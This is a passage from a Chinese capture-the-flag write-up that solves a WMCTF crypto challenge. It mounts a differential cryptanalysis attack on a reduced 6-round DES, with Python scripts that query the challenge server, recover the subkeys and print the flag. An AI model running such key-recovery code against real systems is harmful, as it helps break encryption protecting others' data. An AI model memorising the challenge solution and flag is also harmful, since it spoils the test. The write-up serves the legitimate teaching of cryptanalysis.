T_L&rsquo;$中，有20bit是确定的；经过<strong>逆</strong>P置换后，得到第6轮8个sbox的outputs的差分值，其中有5个对应的sbox的output的差分值是已知的，所以能用medium里的那个方法把这5个sbox的key求出来。</p><p>c&rsquo;为第3个F函数input的差分值，D&rsquo;为第4个F函数input的差分值，F&rsquo;为第6个F函数output的差分值，$T_L&rsquo;$是密文左半部分的差分值。</p></blockquote><p><strong>攻击方法</strong></p><p>DES里面就sbox比较难搞，其他的部分就是一些线性置换，可以通过一些差分特性去操作一下这个sbox，然后就能得到key。</p><p>简单来说就是，找到一个差分特征后，可以用这个特征推4轮，然后计算$F&rsquo; = c&rsquo; \oplus D&rsquo; \oplus T_L&rsquo;$（第6轮F函数output的差分值），逆P置换，得到8个sbox的outputs的差分值out_xors，这个差分值的概率是最大的；接着，将2个已知的第6轮F函数的input（密文的右半部分）去做e扩展，得到$I_1, I_2$，分别分成8组${i_{11}, i_{12}, &mldr;, i_{18}}, {i_{21}, i_{22}, &mldr;, i_{28}}$，对应着8个sbox。</p><p>每一个sbox，对所有可能的64种key（6bit）作判断sbox($i_{1j}$ ^ key) ^ sbox($i_{2j}$ ^ key) == out_xors[j]，如果等于，则将该key计数加1。尝试很多次后，必然有一个key出现的次数最多，且远超其他的key，该key即为正确的key。</p><p>这8个6bit的key合起来就是第6轮的subkey，又由于密钥扩展就是一个置换，可以反推出前面5轮的key。</p><p>把key反过来加密就能getflag。</p><p><strong>手动寻找差分特征</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>collections</span> <span class=kn>import</span> <span class=n>Counter</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>...</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gen_diff_output</span><span class=p>(</span><span class=n>diff</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>getRandomNBitInteger</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>p1</span> <span class=o>^</span> <span class=n>diff</span>
+</span></span><span class=line><span class=cl>    <span class=n>k</span> <span class=o>=</span> <span class=n>getRandomNBitInteger</span><span class=p>(</span><span class=mi>48</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>c1</span><span class=p>,</span> <span class=n>c2</span> <span class=o>=</span> <span class=n>F</span><span class=p>(</span><span class=n>p1</span><span class=p>,</span> <span class=n>k</span><span class=p>),</span> <span class=n>F</span><span class=p>(</span><span class=n>p2</span><span class=p>,</span> <span class=n>k</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>c1</span><span class=o>^</span><span class=n>c2</span><span class=p>,</span> <span class=p>(</span><span class=n>p1</span><span class=p>,</span><span class=n>p2</span><span class=p>,</span><span class=n>c1</span><span class=p>,</span><span class=n>c2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>counter</span> <span class=o>=</span> <span class=n>Counter</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10000</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>P_</span> <span class=o>=</span> <span class=mh>0x00000040</span>
+</span></span><span class=line><span class=cl>    <span class=n>X_</span><span class=p>,</span> <span class=n>_</span> <span class=o>=</span> <span class=n>gen_diff_output</span><span class=p>(</span><span class=n>P_</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>counter</span><span class=p>[</span><span class=n>X_</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>X_</span><span class=p>,</span> <span class=n>freq</span> <span class=o>=</span> <span class=n>counter</span><span class=o>.</span><span class=n>most_common</span><span class=p>(</span><span class=mi>1</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>X_</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;0&#39;</span><span class=p>),</span> <span class=n>freq</span> <span class=o>/</span> <span class=mi>10000</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 0x00000002 -&gt; 0x00000002    0.217</span>
+</span></span><span class=line><span class=cl><span class=c1># 0x00000040 -&gt; 0x00000000    0.2534</span>
+</span></span><span class=line><span class=cl><span class=c1># 0x00000400 -&gt; 0x00000000    0.251</span>
+</span></span><span class=line><span class=cl><span class=c1># 0x00000000 -&gt; 0x00000000    1</span>
+</span></span><span class=line><span class=cl><span class=c1># 0x00002000 -&gt; 0x00000000    0.25</span>
+</span></span><span class=line><span class=cl><span class=c1># 0x00004000 -&gt; 0x00000040    0.22</span>
+</span></span><span class=line><span class=cl><span class=c1># 0x00020000 -&gt; 0x00020000    0.18</span>
+</span></span></code></pre></div><p>发现了好几组非常优秀的差分特征。</p><p>以前我么得选择，现在我随便选。</p><p>就选这个0x00000040 -> 0x00000000 0.2534</p><p><strong>画图分析</strong></p><p><img class=blog-post__image src=https://hackmd.summershrimp.com/uploads/upload_c126a80567a8eeab248c3b0ff26319cd.png alt loading=lazy decoding=async></p><blockquote><p>在线画图：https://draw.io</p></blockquote><p>可以推出来$F&rsquo; = 0x00000040 \oplus T_L'$</p><p><strong>获取数据</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python3 data-lang=python3><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>json</span> <span class=kn>import</span> <span class=n>dump</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>tqdm</span> <span class=kn>import</span> <span class=n>tqdm</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>long_to_bytes</span><span class=p>,</span> <span class=n>getRandomNBitInteger</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gen_diff_input</span><span class=p>(</span><span class=n>diff</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>getRandomNBitInteger</span><span class=p>(</span><span class=mi>64</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>p1</span> <span class=o>^</span> <span class=n>diff</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p1</span><span class=p>,</span> <span class=n>p2</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;81.68.174.63&#34;</span><span class=p>,</span> <span class=mi>34129</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1># context.log_level = &#34;debug&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>rec</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;required&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>cipher_flag</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;\n([0-9a-f]</span><span class=si>{80}</span><span class=s2>)\n&#34;</span><span class=p>,</span> <span class=n>rec</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>cipher_flag</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>pairs</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>tqdm</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=mi>10000</span><span class=p>)):</span>
+</span></span><span class=line><span class=cl>    <span class=n>p1</span><span class=p>,</span> <span class=n>p2</span> <span class=o>=</span> <span class=n>gen_diff_input</span><span class=p>(</span><span class=mh>0x0000000000000040</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>p1</span><span class=p>)</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>c1</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>(</span><span class=n>keepends</span><span class=o>=</span><span class=kc>False</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>p2</span><span class=p>)</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>c2</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>(</span><span class=n>keepends</span><span class=o>=</span><span class=kc>False</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>pairs</span><span class=o>.</span><span class=n>append</span><span class=p>(((</span><span class=n>p1</span><span class=p>,</span><span class=n>p2</span><span class=p>),</span> <span class=p>(</span><span class=n>c1</span><span class=p>,</span><span class=n>c2</span><span class=p>)))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>dump</span><span class=p>([</span><span class=n>cipher_flag</span><span class=p>,</span> <span class=n>pairs</span><span class=p>],</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;data&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>))</span>
+</span></span></code></pre></div><p><strong>差分攻击</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>collections</span> <span class=kn>import</span> <span class=n>Counter</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>json</span> <span class=kn>import</span> <span class=n>load</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>tqdm</span> <span class=kn>import</span> <span class=n>tqdm</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>cipher_flag</span><span class=p>,</span> <span class=n>pairs</span> <span class=o>=</span> <span class=n>load</span><span class=p>(</span><span class=nb>open</span><span class=p>(</span><span class=s2>&#34;data&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>...</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>inv_key</span><span class=p>(</span><span class=n>key</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>inv_key</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=mi>48</span>
+</span></span><span class=line><span class=cl>    <span class=n>key_bin</span> <span class=o>=</span> <span class=nb>bin</span><span class=p>(</span><span class=n>key</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>48</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>48</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>inv_key</span><span class=p>[</span><span class=n>pc_key</span><span class=p>[</span><span class=n>j</span><span class=p>]]</span> <span class=o>=</span> <span class=n>key_bin</span><span class=p>[</span><span class=n>j</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>inv_key</span><span class=p>),</span> <span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>inv_keys</span><span class=p>(</span><span class=n>k6</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>keys</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=mi>6</span>
+</span></span><span class=line><span class=cl>    <span class=n>keys</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>k6</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>keys</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>inv_key</span><span class=p>(</span><span class=n>keys</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>keys</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>inv_p</span><span class=p>(</span><span class=n>x</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>x_bin</span> <span class=o>=</span> <span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>_</span><span class=p>)</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>bin</span><span class=p>(</span><span class=n>x</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>32</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span><span class=p>)]</span>
+</span></span><span class=line><span class=cl>    <span class=n>y_bin</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=mi>32</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>y_bin</span><span class=p>[</span><span class=n>pbox</span><span class=p>[</span><span class=n>i</span><span class=p>]]</span> <span class=o>=</span> <span class=n>x_bin</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>y</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=nb>str</span><span class=p>(</span><span class=n>_</span><span class=p>)</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=n>y_bin</span><span class=p>]),</span> <span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>y</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># --------------------------</span>
+</span></span><span class=line><span class=cl><span class=n>candidate_keys</span> <span class=o>=</span> <span class=p>[</span><span class=n>Counter</span><span class=p>()</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>)]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span><span class=p>,</span> <span class=n>cs</span> <span class=ow>in</span> <span class=n>tqdm</span><span class=p>(</span><span class=n>pairs</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>c1</span><span class=p>,</span> <span class=n>c2</span> <span class=o>=</span> <span class=n>cs</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>c1</span> <span class=o>^</span> <span class=n>c2</span> <span class=o>==</span> <span class=mh>0x0000004000000000</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>continue</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>l1</span><span class=p>,</span> <span class=n>l2</span> <span class=o>=</span> <span class=n>c1</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span><span class=p>,</span> <span class=n>c2</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span>
+</span></span><span class=line><span class=cl>    <span class=n>r1</span><span class=p>,</span> <span class=n>r2</span> <span class=o>=</span> <span class=n>c1</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span><span class=p>,</span> <span class=n>c2</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span>
+</span></span><span class=line><span class=cl>    <span class=c1># print(r1, r2)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>F_</span> <span class=o>=</span> <span class=n>l1</span><span class=o>^</span><span class=n>l2</span><span class=o>^</span><span class=mh>0x00000040</span>
+</span></span><span class=line><span class=cl>    <span class=n>F_</span> <span class=o>=</span> <span class=n>inv_p</span><span class=p>(</span><span class=n>F_</span><span class=p>)</span> <span class=c1># xor of the two outputs of sbox, 32bit</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>Ep1</span> <span class=o>=</span> <span class=n>e</span><span class=p>(</span><span class=n>r1</span><span class=p>)</span> <span class=c1># 48bit</span>
+</span></span><span class=line><span class=cl>    <span class=n>Ep2</span> <span class=o>=</span> <span class=n>e</span><span class=p>(</span><span class=n>r2</span><span class=p>)</span> <span class=c1># 48bit</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>inp1</span> <span class=o>=</span> <span class=p>(</span><span class=n>Ep1</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=mi>7</span><span class=o>-</span><span class=n>i</span><span class=p>)</span><span class=o>*</span><span class=mi>6</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mb>0b111111</span>   <span class=c1># 6bit</span>
+</span></span><span class=line><span class=cl>        <span class=n>inp2</span> <span class=o>=</span> <span class=p>(</span><span class=n>Ep2</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=mi>7</span><span class=o>-</span><span class=n>i</span><span class=p>)</span><span class=o>*</span><span class=mi>6</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mb>0b111111</span>   <span class=c1># 6bit</span>
+</span></span><span class=line><span class=cl>        <span class=n>out_xor</span> <span class=o>=</span> <span class=p>(</span><span class=n>F_</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=mi>7</span><span class=o>-</span><span class=n>i</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mb>0b1111</span>   <span class=c1># 4bit</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>key</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>64</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>s</span><span class=p>(</span><span class=n>inp1</span><span class=o>^</span><span class=n>key</span><span class=p>,</span> <span class=n>i</span><span class=p>)</span> <span class=o>^</span> <span class=n>s</span><span class=p>(</span><span class=n>inp2</span><span class=o>^</span><span class=n>key</span><span class=p>,</span> <span class=n>i</span><span class=p>)</span> <span class=o>==</span> <span class=n>out_xor</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>candidate_keys</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>key</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>candidate_keys</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># ----------------------</span>
+</span></span><span class=line><span class=cl><span class=n>key6</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>candidate_keys</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>c</span><span class=o>.</span><span class=n>most_common</span><span class=p>(</span><span class=mi>2</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>key6</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>c</span><span class=o>.</span><span class=n>most_common</span><span class=p>(</span><span class=mi>1</span><span class=p>)[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>key6</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1># key6 = [53, 44, 38, 7, 7, 30, 29, 52]</span>
+</span></span><span class=line><span class=cl><span class=n>k6</span> <span class=o>=</span> <span class=nb>sum</span><span class=p>(</span><span class=n>key6</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=mi>7</span><span class=o>-</span><span class=n>i</span><span class=p>)</span><span class=o>*</span><span class=mi>6</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=c1># k6 = 236161043654516</span>
+</span></span><span class=line><span class=cl><span class=n>keys</span> <span class=o>=</span> <span class=n>inv_keys</span><span class=p>(</span><span class=n>k6</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>keys</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>ps</span><span class=p>,</span> <span class=n>cs</span> <span class=o>=</span> <span class=n>pairs</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>p1</span><span class=p>,</span> <span class=n>c1</span> <span class=o>=</span> <span class=n>ps</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>cs</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=n>enc_block</span><span class=p>(</span><span class=n>p1</span><span class=p>)</span> <span class=o>==</span> <span class=n>c1</span>
+</span></span><span class=line><span class=cl><span class=c1># Ok! key is right!</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># To decrypt, reverse the keys.</span>
+</span></span><span class=line><span class=cl><span class=n>keys</span> <span class=o>=</span> <span class=n>keys</span><span class=p>[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>enc</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>cipher_flag</span><span class=p>)))</span>
+</span></span><span class=line><span class=cl><span class=c1># b&#39;WMCTF{D1ff3r3nti@1_w1th_1di0t_B0X3s}\x00\x00\x00\x00&#39;</span>
+</span></span></code></pre></div><p>WMCTF{D1ff3r3nti@1_w1th_1di0t_B0X3s}</p><div class=blog-tags><a href=https://su-team.cn/tags/wmctf/>WMCTF</a></div><section class=article-related><h4 class=see-also>See also</h4><ul><li><a href=/post/wmctf-2025-su-wu/>2025 WMCTF SU WriteUp</a></li><li><a href=/post/wmctf-2023-su-wu/>2023 WMCTF SU Write-Up</a></li></ul></section></article></section><ul class="pager blog-pager"><li class=previous><a href=/post/gxzyctf-2020-su-wu/ data-toggle=tooltip data-placement=top title="高校战“疫”网络安全分享赛 2020 SU Write Up">&larr; Previous Post</a></li><li class=next><a href=/post/qwb-s4-su-wu/ data-toggle=tooltip data-placement=top title="强网杯 S4 SU Write-Up">Next Post &rarr;</a></li></ul></div></div></div><footer class=site-footer><div class=container><div class=site-footer__grid><div class=site-footer__brand><h2 class=site-footer__title>su-team</h2><p class=site-footer__tagline>Built for team archives and competition writeups.
+<span class=site-footer__subline>Minimal noise, high signal, and fast navigation.</span></p></div><div class=site-footer__meta><ul class="list-inline footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime rel="noopener noreferrer" target=_blank><span class=footer-link__icon><img class=footer-social-img src=/img/ctftime.svg title=CTFTime alt=CTFTime></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class=footer-link__icon><i class="fas fa-envelope" aria-hidden=true></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class=footer-link__icon><i class="fab fa-github" aria-hidden=true></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
+&nbsp;&bull;&nbsp;&copy;
+2026
+&nbsp;&bull;&nbsp;
+<a href=/>su-team</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>
